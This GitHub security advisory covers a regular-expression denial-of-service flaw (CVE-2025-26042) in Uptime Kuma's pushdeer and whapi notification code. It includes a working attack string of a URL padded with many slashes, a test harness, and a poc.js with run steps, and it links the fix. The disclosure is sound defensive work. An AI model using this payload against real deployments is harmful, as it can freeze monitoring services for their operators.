# [M] Uptime Kuma's Regular Expression in pushdeeer and whapi file Leads to ReDoS Vulnerability Due to Catastrophic Backtracking

## Summary
Severity: Medium
Advisory: GHSA-hx7h-9vf7-5xhg
CVE: CVE-2025-26042
CWE: CWE-1333
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:A/VC:N/VI:N/VA:H/SC:L/SI:L/SA:L (CVSS_V4)
Published: 2025-03-31
Source: https://github.com/advisories/GHSA-hx7h-9vf7-5xhg
Type: github-advisory

## Affected
- npm: `uptime-kuma` — affected >=1.15.0
- npm: `uptime-kuma` — affected >=2.0.0-beta.0 <2.0.0-beta.2

## Details
### Summary
There is a `ReDoS vulnerability risk` in the system, specifically when administrators create `notification` through the web service(`pushdeer` and `whapi`). If a string is provided that triggers catastrophic backtracking in the regular expression, it may lead to a ReDoS attack.

### Details
The regular expression` \/*$\` is used to match zero or more slashes `/` at the end of a URL. When a malicious attack string appends a large number of slashes `/` and a non-slash character at the end of the URL, the regular expression enters a backtracking matching process. During this process, the regular expression engine starts checking each slash from the first one, continuing until it encounters the last non-slash character. Due to the greedy matching nature of the regular expression, this process repeats itself, with each backtrack checking the next slash until the last slash is checked. This backtracking process consumes significant CPU resources.
```js
.replace(/\/*$/, "")
```
For the regular expression `/\/*$/`, an attack string like 
```javascript
"https://e" + "/".repeat(100000) + "@" 
```
can trigger catastrophic backtracking, causing the web service to freeze and potentially leading to a ReDoS attack.
> When entered from the web interface, the attack string needs to expand `"/".repeat(100000)` and be input directly, such as `https://e/////////..//@`. This triggers catastrophic backtracking, leading to web service lag and posing a potential ReDoS attack risk.

### PoC
The poc.js is in: 
https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0
The time lag phenomenon can be observed through test-pushdeer-ReDos, which helps verify the presence of the ReDoS attack:
```javascript
const semver = require("semver");
let test;
const nodeVersion = process.versions.node;
if (semver.satisfies(nodeVersion, ">= 18")) {
    test = require("node:test");
} else {
    test = require("test");
}
const PushDeer = require("../../server/notification-providers/pushdeer.js");

const assert = require("node:assert");

test("Test ReDos - attack string", async (t) => {
    const pushDeer = new PushDeer();
    const notification = {
        pushdeerServer: "https://e" + "/".repeat(100000) + "@",
    };
    const msg = "Test Attacking";
    const startTime = performance.now();
    try {
        pushDeer.send(notification, msg)
    } catch (error) {
    // pass
    }
    const endTime = performance.now();
    const elapsedTime = endTime - startTime;
    const reDosThreshold = 2000;
    assert(elapsedTime <= reDosThreshold, `🚨 Potential ReDoS Attack! send method took ${elapsedTime.toFixed(2)} ms, exceeding threshold of ${reDosThreshold} ms.`);
});
```
> Move the `test-uptime-calculator.js` file to the `./uptime-kuma/test/backend-test` folder and run `npm run test-backend` to execute the backend tests.

Trigger conditions for whapi jams, In the send function within the `uptime-kuma\server\notification-providers\pushdeer.js` file:
https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28
```js
// The attack string "httpS://example" + "/".repeat(100000) + "@"
// poc.js
// Import the target file
const Whapi = require("./uptime-kuma/server/notification-providers/whapi");

// Create an instance of Whapi
const whapi = new Whapi();

const notification = {
    whapiApiUrl: "https://e" + "/".repeat(100000) + "@",
};
// console.log(`${notification.whapiApiUrl}`);
// Define the message to be sent
const msg = "Test Attacking";

// Call the send method and handle exceptions
whapi.send(notification, msg)

// 1-5 are the original installation methods for the project
// 6-8 are attack methods
// ---
// 1.run `git clone https://github.com/louislam/uptime-kuma.git`
// 2.run `cd uptime-kuma`
// 3.run `npm run setup`
// 4.run `npm install pm2 -g && pm2 install pm2-logrotate`
// 5.run `pm2 start server/server.js --name uptime-kuma`
// ---
// 6.Run npm install in the root directory of the same level as `README.md`
// 7.Move `poc.js` to the root directory of the same level as `README.md`
// 8.and then run `node poc.js`
```

After running, a noticeable lag can be observed, with the regular expression matching time increasing from a few milliseconds to over 2000 milliseconds.
<img width="760" alt="redos" src="https://github.com/user-attachments/assets/98f18fee-7555-410e-98c8-763906843812" />

You can also perform this attack on the web interface. By timing the operation, it can be observed that the lag still occurs. The key to the attack string is appending a large number of `/` to the URL, followed by a `non-/` character at the end, entered directly.

<img width="1280" alt="1" src="https://github.com/user-attachments/assets/61945200-4397-4933-9170-2a5517613408" />
<img width="1280" alt="webserver" src="https://github.com/user-attachments/assets/c0d7e952-0ec1-4c54-ba31-8b7144c04669" />

### Impact
**What kind of vulnerability is it?**

This is a `Regular Expression Denial of Service (ReDoS)` vulnerability. ReDoS exploits poorly designed regular expressions that can lead to excessive backtracking under certain input conditions, causing the affected application to consume high CPU and memory resources. This can result in `significant performance degradation or complete service unavailability`, especially when processing specially crafted attack strings.

**Who is impacted?**
1. **Uptime Kuma users**:
Any users or administrators running the Uptime Kuma project are potentially affected, especially if they allow untrusted input through the web interface or notification services like `pushdeer.js` and `whapi.js`. Attackers can exploit this vulnerability by injecting crafted strings into the input fields.

2. **Web services and hosting providers**:
If Uptime Kuma is deployed in a production environment, the vulnerability could impact hosting providers or servers running the application, leading to `downtime`, `degraded performance`, or `resource exhaustion`.

### Solution
@louislam I have provided a solution for you to check:https://github.com/louislam/uptime-kuma/pull/5573

## References
- https://github.com/louislam/uptime-kuma/security/advisories/GHSA-hx7h-9vf7-5xhg
- https://nvd.nist.gov/vuln/detail/CVE-2025-26042
- https://github.com/louislam/uptime-kuma/issues/5574
- https://github.com/louislam/uptime-kuma/pull/5573
- https://github.com/louislam/uptime-kuma/commit/7a9191761dbef6551c2a0aa6eed5f693ba48d688
- https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0
- https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28
- https://github.com/louislam/uptime-kuma
